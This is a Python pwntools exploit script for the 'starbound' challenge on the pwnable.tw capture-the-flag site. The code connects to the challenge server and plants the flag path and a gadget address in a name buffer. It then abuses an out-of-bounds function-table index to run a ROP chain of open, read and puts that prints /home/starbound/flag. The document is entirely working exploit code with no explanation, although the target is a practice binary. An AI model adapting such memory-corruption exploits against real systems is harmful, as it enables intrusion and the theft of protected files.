from pwn import *

context(arch='i386',os='linux',endian='little')
context.log_level='debug'
elf = ELF('./starbound')

p=remote('chall.pwnable.tw',10202)
file = b'/home/starbound/flag\0\0\0\0'
gadget = 0x08048e48

shellcode = file + p32(gadget) + b'a'*4


p.recvuntil(b'> ')
p.send(b'6')
p.recvuntil(b'> ')
p.send(b'2')
p.recvuntil(b': ')
p.send(shellcode)
p.recvuntil(b'> ')
bss_function = 0x08058150
bss_name = 0x080580D0
distance = int((bss_name + len(file) - bss_function)/4)
#print str(distance)
#gdb.attach(p,'b *0x0804A65D')
cat_flag_exp = b''
cat_flag_exp += str(distance-1).encode() + b'\0' + b'a'*4 + p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \
+ p32(0)+ b'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +b'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)
p.sendline(cat_flag_exp)
p.interactive()